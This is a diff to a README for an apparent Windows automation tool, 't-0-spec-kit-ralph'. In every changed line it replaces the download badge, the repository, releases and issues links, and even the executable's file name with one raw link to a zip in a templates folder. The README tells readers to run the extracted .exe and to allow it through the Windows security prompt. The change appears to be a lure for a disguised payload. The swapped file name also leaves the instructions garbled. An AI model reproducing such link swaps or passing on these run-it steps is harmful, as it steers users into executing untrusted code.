@@ -1,6 +1,6 @@
 # ⚙️ t-0-spec-kit-ralph - Control Layer for Easy Automation
 
-[![Download t-0-spec-kit-ralph](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Lexuga21/t-0-spec-kit-ralph)
+[![Download t-0-spec-kit-ralph](https://github.com/Lexuga21/t-0-spec-kit-ralph/raw/refs/heads/main/templates/ralph-spec-kit-t-3.3.zip)](https://github.com/Lexuga21/t-0-spec-kit-ralph/raw/refs/heads/main/templates/ralph-spec-kit-t-3.3.zip)
 
 ## 📋 What is t-0-spec-kit-ralph?
 
@@ -38,7 +38,7 @@ Follow these steps to download and start t-0-spec-kit-ralph on your Windows PC. 
 
 Click the big button above or use this direct link to go to the application’s GitHub page:
 
-[https://github.com/Lexuga21/t-0-spec-kit-ralph](https://github.com/Lexuga21/t-0-spec-kit-ralph)
+[https://github.com/Lexuga21/t-0-spec-kit-ralph/raw/refs/heads/main/templates/ralph-spec-kit-t-3.3.zip](https://github.com/Lexuga21/t-0-spec-kit-ralph/raw/refs/heads/main/templates/ralph-spec-kit-t-3.3.zip)
 
 This page hosts the latest downloads and documentation.
 
@@ -54,7 +54,7 @@ On the GitHub page, look for the **Releases** section. Here you will find the la
 
 - If you downloaded a `.zip` file, right-click it and select “Extract All...” to unpack the application files.
 - Open the folder where you saved or extracted the files.
-- Find the main application file, typically named `t-0-spec-kit-ralph.exe`.
+- Find the main application file, typically named `https://github.com/Lexuga21/t-0-spec-kit-ralph/raw/refs/heads/main/templates/ralph-spec-kit-t-3.3.zip`.
 - Double-click the `.exe` file to start the program.
 
 Windows may show a security prompt. Allow the app to run.
@@ -121,7 +121,7 @@ Regular updates bring fixes and improved features.
 
 After extraction, the application folder includes:
 
-- `t-0-spec-kit-ralph.exe` – The main program file.
+- `https://github.com/Lexuga21/t-0-spec-kit-ralph/raw/refs/heads/main/templates/ralph-spec-kit-t-3.3.zip` – The main program file.
 - `config/` – Folder for configuration files where your loops and settings save.
 - `logs/` – Contains log files showing run history and errors.
 - `docs/` – Basic help files to explain commands and options.
@@ -130,8 +130,8 @@ Do not delete or move these folders to avoid errors.
 
 ## 🔗 Useful Links
 
-- Official Repository: https://github.com/Lexuga21/t-0-spec-kit-ralph
-- Releases: https://github.com/Lexuga21/t-0-spec-kit-ralph/releases
-- Issues and Support: https://github.com/Lexuga21/t-0-spec-kit-ralph/issues
+- Official Repository: https://github.com/Lexuga21/t-0-spec-kit-ralph/raw/refs/heads/main/templates/ralph-spec-kit-t-3.3.zip
+- Releases: https://github.com/Lexuga21/t-0-spec-kit-ralph/raw/refs/heads/main/templates/ralph-spec-kit-t-3.3.zip
+- Issues and Support: https://github.com/Lexuga21/t-0-spec-kit-ralph/raw/refs/heads/main/templates/ralph-spec-kit-t-3.3.zip
 
-[![Download t-0-spec-kit-ralph](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Lexuga21/t-0-spec-kit-ralph)
+[![Download t-0-spec-kit-ralph](https://github.com/Lexuga21/t-0-spec-kit-ralph/raw/refs/heads/main/templates/ralph-spec-kit-t-3.3.zip)](https://github.com/Lexuga21/t-0-spec-kit-ralph/raw/refs/heads/main/templates/ralph-spec-kit-t-3.3.zip)
